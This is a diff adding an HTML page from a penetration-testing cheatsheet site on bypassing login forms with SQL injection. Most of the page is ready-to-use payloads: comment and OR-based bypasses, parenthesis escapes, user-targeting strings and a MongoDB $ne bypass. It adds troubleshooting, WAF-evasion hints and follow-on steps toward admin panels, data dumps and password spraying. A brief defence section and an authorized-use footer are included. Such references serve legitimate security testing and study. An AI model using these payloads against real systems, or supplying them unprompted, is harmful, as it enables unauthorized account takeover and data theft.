@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQLi Authentication Bypass · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>SQLi Authentication Bypass</h1><p class="cx-lede">Bypassing login forms via SQL injection in the username or password field.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1078</span><span class="cx-tag">D3FEND D3-MH, D3-MFA, D3-SPP</span><span class="cx-tag">IMPACT AuthBypass</span><span class="cx-tag">OWASP A05, A07</span></div><article class="cx-body"><p>Login forms typically build a query like:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SELECT * FROM users WHERE username = &#x27;&lt;INPUT&gt;&#x27; AND password = &#x27;&lt;INPUT&gt;&#x27;;</code></pre></figure>
+<p>Goal: make the <code>WHERE</code> clause evaluate to true regardless of credentials, or comment out the password check.</p>
+<h2 id="tldr">TL;DR</h2>
+<p>Try these in the <strong>username</strong> field, leave password empty (or anything):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>admin&#x27;-- -
+admin&#x27;#
+admin&#x27; OR &#x27;1&#x27;=&#x27;1
+admin&#x27; OR 1=1-- -
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;-- -
+&#x27; OR 1=1-- -
+&#x27;) OR (&#x27;1&#x27;=&#x27;1
+&#x27;) OR 1=1-- -
+&quot;-- -
+&quot; OR &quot;&quot;=&quot;</code></pre></figure>
+<p>If the application returns the <em>first</em> row of the users table after a successful "login" payload, you typically log in as <code>admin</code> (or whatever user is row 1).</p>
+<h2 id="comment-based-bypass">Comment-based bypass</h2>
+<p>Comment out everything after the username:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>admin&#x27;-- -</code></pre></figure>
+<p>Resulting query:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SELECT * FROM users WHERE username = &#x27;admin&#x27;-- -&#x27; AND password = &#x27;anything&#x27;;</code></pre></figure>
+<p>The password check is now part of the comment.</p>
+<p>Comment syntax varies by DBMS:</p>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Line comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL/MariaDB</td>
+<td><code>--</code> (note trailing space) or <code>#</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>--</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>--</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>--</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>--</code></td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>In URLs, a trailing space is unreliable - use <code>-- -</code> (the trailing <code>-</code> ensures a non-space character keeps the comment valid). The <code>#</code> only works in MySQL and must be URL-encoded as <code>%23</code> when used in URLs.</p>
+</div>
+<h2 id="or-based-bypass-no-valid-username-needed">OR-based bypass (no valid username needed)</h2>
+<p>If you don't know any usernames:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; OR 1=1-- -
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;-- -</code></pre></figure>
+<p>Resulting query:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SELECT * FROM users WHERE username = &#x27;&#x27; OR 1=1-- -&#x27; AND password = &#x27;anything&#x27;;</code></pre></figure>
+<p>This returns <em>all</em> users. Most apps log you in as the first row, which is typically <code>admin</code> because it was created first.</p>
+<h2 id="bypassing-parenthesised-queries">Bypassing parenthesised queries</h2>
+<p>If the query wraps conditions in parentheses, you must close them:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SELECT * FROM users WHERE (username=&#x27;&lt;INPUT&gt;&#x27; AND id &gt; 1) AND password = &#x27;&lt;INPUT&gt;&#x27;;</code></pre></figure>
+<p>Single-quote alone causes a syntax error because the <code>)</code> is unmatched. Add the closing paren:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>admin&#x27;)-- -
+&#x27;) OR (&#x27;1&#x27;=&#x27;1
+&#x27;) OR 1=1) -- -</code></pre></figure>
+<p>If unsure how many parens, try escalating: <code>'-- -</code>, <code>')-- -</code>, <code>'))-- -</code>.</p>
+<h2 id="targeting-a-specific-user">Targeting a specific user</h2>
+<p>When <code>' OR 1=1</code> returns row 1 (admin) but you need a specific user (or admin isn't row 1):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; OR username=&#x27;target_user&#x27;-- -
+&#x27; OR id=5-- -</code></pre></figure>
+<p>Used when you can enumerate user IDs but not authenticate. The <code>OR</code> is critical - <code>AND</code> would require knowing the password.</p>
+<h2 id="when-the-password-field-is-the-injection-point">When the password field is the injection point</h2>
+<p>If the username field is filtered or hashed but the password is concatenated raw:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Username: any_real_user
+Password: &#x27; OR &#x27;1&#x27;=&#x27;1</code></pre></figure>
+<p>Less common - many apps hash the password before substituting it into the query, which neutralises injection. Test both fields independently.</p>
+<h2 id="nosql-equivalent">NoSQL equivalent</h2>
+<p>MongoDB-backed login forms use a different bypass - see <a href="../nosql/index.html">NoSQL injection</a>. Quick test for JSON-based logins:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$ne&quot;: null}}</code></pre></figure>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>Same payload works in browser but not via proxy</strong> - proxy is sending unencoded characters. URL-encode the payload.</li>
+<li><strong>Payload returns HTTP 200 but no login</strong> - application uses a different query for auth than what you assumed (e.g., it counts rows and requires exactly 1). Try payloads that return one row: <code>admin'-- -</code> instead of <code>' OR 1=1-- -</code>.</li>
+<li><strong>Login succeeds but session is rejected on next request</strong> - application stores the user ID separately and validates it. The injection logged you in as a non-existent user. Use <code>admin'-- -</code> or another payload that authenticates as a real user.</li>
+<li><strong>Account lockout triggers</strong> - rate-limit your attempts. Some apps lock the account after N failed logins regardless of how the failure occurred.</li>
+</ul>
+<div class="cx-aside cx-danger">
+<p class="cx-aside-title">Danger</p>
+<p>Account lockout is an availability risk during real engagements. A single misfired payload can lock the actual administrator out of production. Confirm lockout policy before mass-testing auth bypass payloads.</p>
+</div>
+<h2 id="defence-reference">Defence reference</h2>
+<p>Parameterised queries make this entire class of attack impossible. If you find an auth bypass, the fix is always "use prepared statements" - never blocklist characters.</p>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>Logged in as the first user (often <code>admin</code>)</strong> → enumerate the admin panel; look for <a href="../../uploads/index.html">file upload</a>, settings pages that allow command execution, or user-management flows</li>
+<li><strong>Logged in as a non-admin user</strong> → re-run the bypass with <code>' UNION SELECT username FROM users WHERE is_admin=1-- -</code> style payload to target a specific account, or escalate via <a href="../../idor/index.html">IDOR</a> inside the app</li>
+<li><strong>Bypass works but lands on a confused state</strong> → the application may require post-login session bootstrap; check cookies and follow the redirect chain manually</li>
+<li><strong>Bypass blocked by parameterized queries on login but other endpoints unfiltered</strong> → injection lives elsewhere - return to <a href="../index.html">overview</a> and probe search / filter / sort parameters</li>
+<li><strong>Bypass payload errors leak SQL</strong> → you have full injection, not just auth bypass; switch to <a href="../union-based/index.html">UNION-based</a> or <a href="../union-based/index.html#error-based-extraction-as-fallback">error-based extraction</a> for data dump</li>
+<li><strong>WAF blocks <code>--</code> / <code>'</code> / <code>OR</code></strong> → encode (URL/hex), use comment variants (<code>-- -</code>, <code>/*comment*/</code>), or try <a href="../bypasses/index.html">Bypasses</a></li>
+<li><strong>All bypass attempts blocked, no SQL errors</strong> → backend uses prepared statements; pivot to <a href="../../auth/username-enumeration/index.html">username enumeration</a> or password spraying instead</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../detection/index.html">Previous: SQLi Detection</a><a class="cx-next" href="../union-based/index.html">Next: UNION-based SQLi</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
